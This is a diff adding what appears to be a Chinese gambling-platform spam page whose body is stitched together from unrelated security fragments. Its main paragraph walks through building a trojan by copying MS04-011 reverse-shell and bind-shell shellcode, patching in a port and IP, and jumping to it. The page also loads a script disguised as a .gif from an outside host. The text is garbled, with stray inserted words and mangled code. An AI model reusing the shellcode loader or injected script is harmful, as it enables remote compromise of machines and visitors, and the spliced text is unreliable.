@@ -1,0 +1,99 @@
+<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>杏彩平台总代理 - 网站</title>
+<meta content="all" name="robots" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
+<div class="wrap">
+   <div class="clear blank10"></div>
+   <div class="navi">　您现在的位置 <a  href="http:///baidugo">首页</a> ><a  href="http:///baiducom">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidu">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
+   <div class="clear blank10"></div>
+   <div class="newsmain">
+      <div id="side">
+	      <div class="sideNav">
+		     <h2>热门文章</h2>
+		        <ul><li><a href="http://www.15bl.com/baidugo">银航国际怎么样</a></li>
+</ul>
+		   <div class="sidebottom"></div>
+	       </div>
+       </div>
+       <div class="rightPar" id="about">
+            <div class="aboutTitle">
+                <h3><span>作者：admin </span> 杏彩平台总代理</h3>
+            </div>
+              <div id="MyContent">
+					<div id="MyContent"><p>我无语，这算是高深的吗？难怪中国的进步得title那么的缓慢，都是有了这一种保守派，不愿意和人分享成果而造成的。
+</p>
+<p>当然，shellcode不是一两决话就能说清楚的，简单的说就是只要我们执行了特殊的shellcodetitle那么我们就得到权限了，如果这样理解的话，title那么我们可以把shellcode当作一个汇编中的子程序来看待了！到目前为止，我们已经把思路搞清楚了，title那么我怎么让才能让对方实行我们的shellcod呢？大家学过汇编就会知道，在汇编中要实行它的子程序的时候我利用callPN，所以我们现在要让我们的木马执行这段shellcode时，当然在VC里面我们是不能用call的，因为它是汇编中的伪指令，而VC中并没有这个伪指令，所以我们就要在VC中嵌入汇编代码，要利用__asm，去实行已经装载在内存中的shellcode了，哈哈，sunlion[EST]这个学期正好开汇编的课，前几天还对win32asm进行了不少的研究，终于在这里都用上了！好了，原理就是这样了！我们现在要自己写这个木马，shellcode已经出现了，就是在ms04011里面的reverseshell[]和bindshell[]，只要我们把这段代码实行了就可以得到权限了，但是大家想ms04011为什么能绑定端口和连接到我们的电脑呢？其实这些功能都是包含在shellcode里面了，那为什么ms04011要获取后面输入的参数如IP和端口，而且还把我们提取的IP和端口写到shellcode里面呢？笨蛋，呵呵如果我们不把IP和端口放到里面title那么对方实行完shellcode后就不知道连接到那里去了啊，所以我们要把IP和端口写到里面去，呵呵这样计算机实行shellcode后，就会和我们建立一个winsock连接到我们设定好了的IP和端口了！其实写到这里，这个木马的主要工作原理已经出来了，知道的朋友看到这里估计已经都会写出自己的程序来了，下面我再在大家面前献丑了哦：）！首先，定义头文件：#include&lt;windows.h#pragmacomment(lib,"ws2_32")这里是建立winsock时需要的头文件接下来我们要把ms04011里的shellcode考过来：reverseshellcode，这里是反向连接时要用到的插如端口的偏移量是118，插入IP的偏移量是111unsignedcharreverseshell[]="xEBx10x5Bx4Bx33xC9x66xB9x25x01x80x34x0Bx99xE2xFA""xEBx05xE8xEBxFFxFFxFF""x70x62x99x99x99xC6xFDx38xA9x99x99x99x12xD9x95x12""xE9x85x34x12xF1x91x12x6ExF3x9DxC0x71x02x99x99x99""x7Bx60xF1xAAxABx99x99xF1xEExEAxABxC6xCDx66x8Fx12""x71xF3x9DxC0x71x1Bx99x99x99x7Bx60x18x75x09x98x99""x99xCDxF1x98x98x99x99x66xCFx89xC9xC9xC9xC9xD9xC9""xD9xC9x66xCFx8Dx12x41xF1xE6x99x99x98xF1x9Bx99x9D""x4Bx12x55xF3x89xC8xCAx66xCFx81x1Cx59xECxD3xF1xFA""xF4xFDx99x10xFFxA9x1Ax75xCDx14xA5xBDxF3x8CxC0x32""x7Bx64x5FxDDxBDx89xDDx67xDDxBDxA4x10xC5xBDxD1x10""xC5xBDxD5x10xC5xBDxC9x14xDDxBDx89xCDxC9xC8xC8xC8""xF3x98xC8xC8x66xEFxA9xC8x66xCFx9Dx12x55xF3x66x66""xA8x66xCFx91xCAx66xCFx85x66xCFx95xC8xCFx12xDCxA5""x12xCDxB1xE1x9Ax4CxCBx12xEBxB9x9Ax6CxAAx50xD0xD8""x34x9Ax5CxAAx42x96x27x89xA3x4FxEDx91x58x52x94x9A""x43xD9x72x68xA2x86xECx7ExC3x12xC3xBDx9Ax44xFFx12""x95xD2x12xC3x85x9Ax44x12x9Dx12x9Ax5Cx32xC7xC0x5A""x71x99x66x66x66x17xD7x97x75xEBx67x2Ax8Fx34x40x9C""x57x76x57x79xF9x52x74x65xA2x40x90x6Cx34x75x60x33""xF9x7ExE0x5FxE0";bindshellcode这里是我们主动连接是要用到的shellcode，插入端口的偏移量是176unsignedcharbindshell[]="xEBx10x5Ax4Ax33xC9x66xB9x7Dx01x80x34x0Ax99xE2xFA""xEBx05xE8xEBxFFxFFxFF""x70x95x98x99x99xC3xFDx38xA9x99x99x99x12xD9x95x12""xE9x85x34x12xD9x91x12x41x12xEAxA5x12xEDx87xE1x9A""x6Ax12xE7xB9x9Ax62x12xD7x8DxAAx74xCFxCExC8x12xA6""x9Ax62x12x6BxF3x97xC0x6Ax3FxEDx91xC0xC6x1Ax5Ex9D""xDCx7Bx70xC0xC6xC7x12x54x12xDFxBDx9Ax5Ax48x78x9A""x58xAAx50xFFx12x91x12xDFx85x9Ax5Ax58x78x9Bx9Ax58""x12x99x9Ax5Ax12x63x12x6Ex1Ax5Fx97x12x49xF3x9AxC0""x71x1Ex99x99x99x1Ax5Fx94xCBxCFx66xCEx65xC3x12x41""xF3x9CxC0x71xEDx99x99x99xC9xC9xC9xC9xF3x98xF3x9B""x66xCEx75x12x41x5Ex9Ex9Bx99x9Dx4BxAAx59x10xDEx9D""xF3x89xCExCAx66xCEx69xF3x98xCAx66xCEx6DxC9xC9xCA""x66xCEx61x12x49x1Ax75xDDx12x6DxAAx59xF3x89xC0x10""x9Dx17x7Bx62x10xCFxA1x10xCFxA5x10xCFxD9xFFx5ExDF""xB5x98x98x14xDEx89xC9xCFxAAx50xC8xC8xC8xF3x98xC8""xC8x5ExDExA5xFAxF4xFDx99x14xDExA5xC9xC8x66xCEx79""xCBx66xCEx65xCAx66xCEx65xC9x66xCEx7DxAAx59x35x1C""x59xECx60xC8xCBxCFxCAx66x4BxC3xC0x32x7Bx77xAAx59""x5Ax71x76x67x66x66xDExFCxEDxC9xEBxF6xFAxD8xFDxFD""xEBxFCxEAxEAx99xDAxEBxFCxF8xEDxFCxC9xEBxF6xFAxFC""xEAxEAxD8x99xDCxE1xF0xEDxCDxF1xEBxFCxF8xFDx99xD5""xF6xF8xFDxD5xF0xFBxEBxF8xEBxE0xD8x99xEExEAxABxC6""xAAxABx99xCExCAxD8xCAxF6xFAxF2xFCxEDxD8x99xFBxF0""xF7xFDx99xF5xF0xEAxEDxFCxF7x99xF8xFAxFAxFCxE9xED""x99xFAxF5xF6xEAxFCxEAxF6xFAxF2xFCxEDx99";然后进行函数主体部分的编写：voidmain(intargc,charargv[])unsignedshortport;定义portunsignedshortstag;unsignedlongip;定义IPWSADATAwsa;WSAStartup(MAKEWORD(2,2),&amp;wsa);这里负责对sock的初始话，其中调用到2.2版本if(argc==2)判断我们是要求是主动连接还是反弹连接，如果argc==2，说明我要主动连接port=htons(atoi(argv[1]))^(USHORT)0x9999;根据我输入的端口提取端口memcpy(&amp;bindshell[176],&amp;port,2);把它复制到已经装载到内存中的bindshell偏移为176的地方__asm这里我们要调用汇编leaeax,bindshell取得bindshell在内存中的偏移地址jmpeax使用无条件跳转指令把程序跳到bindshell的地方，去让系统实行我们的精心构造的shellcodeelseif(argc==3)这里是我要反弹连接是port=htons(atoi(argv[1]))^(USHORT)0x9999;提取端口ip=inet_addr(argv[2])^(ULONG)0x99999999;提取IPmemcpy(&amp;reverseshell[118],&amp;port,2)；把端口复制到shellcode的内存偏移地址为118的单元中memcpy(&amp;reverseshell[111],&amp;ip,4);把IP复制到偏移量为111的内存单元中__asmleaeax,reverseshell取得偏移地址，存放到exa中jmpeax让程序跳到这里，实行elseprintf("主动连接Usage:evilsun&lt;listenport反向连接Usage:evilsun&lt;connectbackport&lt;connectbackIP");如果我们输入的参数不是2或3时提示大家用法！到这里这个程序的基本框架已经完成了！大家看到这里是不是对木马已经有所了解了吧！其实要达到这一步相当的不容易，你知道我们读了ms04011的时候，连续读了两片都没有感觉，哪个时候我差点都要放弃了；我最终还是把代码认真认真的继续读下去，把代码都读懂以后才开始想，怎么利用到ms04011的代码，你不要以为一开始我就知道利用ms04011里面的这些代码的，如果你也去认真的把ms04011里面的代码读一次话，title那么你才会感觉得到我说的，title那么不容易！
+</p>
+<p>因此，NetBIOS就成为本文中第一个要探讨的重要课题。
+</p>
+<p>139.如何查找重复记录？SELECTFROMTABLE_NAMEWHEREROWID!=(SELECTMAX(ROWID)FROMTABLE_NAMEDWHERETABLE_NAME.COL1=D.COL1ANDTABLE_NAME.COL2=D.COL2);
+</p>
+<p>ProcedureShowSet;BeginApplication.CreateForm(TSetForm,SetForm);WithSetFormdoBeginTableNameET.Text:=sOption.TableName;FieldNameET.Text:=sOption.FieldName;FieldTypeCombox.ItemIndex:=FieldTypeCombox.Items.IndexOf(sOption.FiledType);End;SetForm.ShowModal;SetForm.Free;End;在主表单中设置的点击事件中添加上showset过程就行了。
+</p>
+<p>extern"C"LRESULTWINAPIKeyboardProc(intnCode,WPARAMwParam,LPARAMlParam)
+</p>
+<p>在你执行SL以前进行错误检查。
+</p>
+<p>通过以上操作，ActiveX控件就再也无法私自调用脚本程序了。
+</p>
+<p>lpBuff的大小只有8字节，算进结尾的''，那strcat最多只能写入7个"A"，但程序实际写入了11个"A"外加1个''。
+</p>
+<p>编译代码。
+</p>
+<p>在通过局域网连接到INTERNET的环境下，经常会采用防火墙或者其他保护措施，如果在NT环境下，如果开放了文件共享，或者允许TELNET，这台机器就需要更好的保护，比如在防火墙中对137139端口，SMB协议下的NT文件共享加以限制、使用SSH取代UNIX环境下的TELNET连接。
+</p>
+<p>因此，当hacker用crack到的进入系统后，第一条所敲的指令是改变shell类型的指令.exampleindigitalunix下:c:telnetXXX.XXX.XXX.XXXDigitalUNIX(center)(ttyp5)login:tommyPassword:Lastlogin:SunOct1122:43:51fromHPVCDigitalUNIXV4.0A(Rev.464);SatFeb719:54:12GMT+08001998Theinstallationsoftwarehassuccessfullyinstalledyoursystem.Therearelogfilesthatcontainarecordofyourinstallation.Theseare:varadmsmlogsinstall.cdfconfigurationdescriptionfilevaradmsmlogsinstall.loggenerallogfilevaradmsmlogsinstall.FS.logfilesystemcreationlogsvaradmsmlogssetld.loglogforthesetld(8)utilityvaradmsmlogsfverify.logverificationlogfilecenterchshOldshell:binshNewshell:ksh其他系统不在此一一列举。
+</p>
+<p>J.D.Edwards的合作伙伴则表示对此事感到震惊，其代理商MSS科技公司总裁Hawksworth认为，虽然他不了解仁科和J.D.Edwards的董事会情况，但是显然两者现在一定很“忙碌。
+</p>
+<p>随着木马，后门的不停发展，防火墙本身也在不断地发展，这是一个矛和盾和关系，知道如何逃过防火墙对于控制一台系统是有很重大的意义的。
+</p>
+<p>全面布署主机入侵检测系统代价较大，企业中很难将所有主机用主机入侵检测系统保护，只能选择部分主机保护。
+</p>
+<p>再编辑文件etcsnooptab默认配置就可以了。
+</p>
+<p>六、单击&lduo;确定&rduo;按钮，停止该项。
+</p>
+<p>同样的，你一年以前所安装的防火墙对于你现在的情况已经不是最好的解决方案了。
+</p>
+<p>需要注意的是，这里的&lduo;小木虫&rduo;必须是网站标题的一部分，比如站点的标题就是&lduo;全球最大中文搜索引擎&rduo;，title那么我们就可以用&lduo;中文搜索引擎title:bookmarks&rduo;来搜索那些收藏了的人还收藏了什么网站。
+</p>
+<p>Foxmail与Dreammail哪个更好？这是一个“萝卜白菜，各有所爱的问题。
+</p>
+<p>骗骗人。
+</p>
+<p>先认识一下TCP报头的这六个标志位。
+</p>
+<p>下图是“管理中“新建过程中的器检测页面。
+</p>
+<p>感染病毒和木马的常见方式，一是运行了被感染有病毒木马的程序，一是浏览网页、邮件时被利用浏览器，病毒木马下载运行了，这基本上是目前最常见的两种感染方式了。
+</p>
+<p>Smurf攻击依靠攻击者的力量使用欺骗性源地址发送echotitle请求。
+</p>
+<p>它只能检测当前title请求。
+</p>
+<p>win2k的进程查看器无法将其杀除。
+</p>
+
+					<br/>
+					<p align=left >上一篇：<a href="551.html">纬来娱乐网址
+</a>|下一篇：<a href="553.html">LOL娱乐怎么样
+</a></P>
+					</div>
+		  </div>
+     </div>
+  </div>
+</div>
+<div class="clear blank10"></div>
+<div class="copyright"> <br>
+ </div>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
+  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
+</body>
+</html>
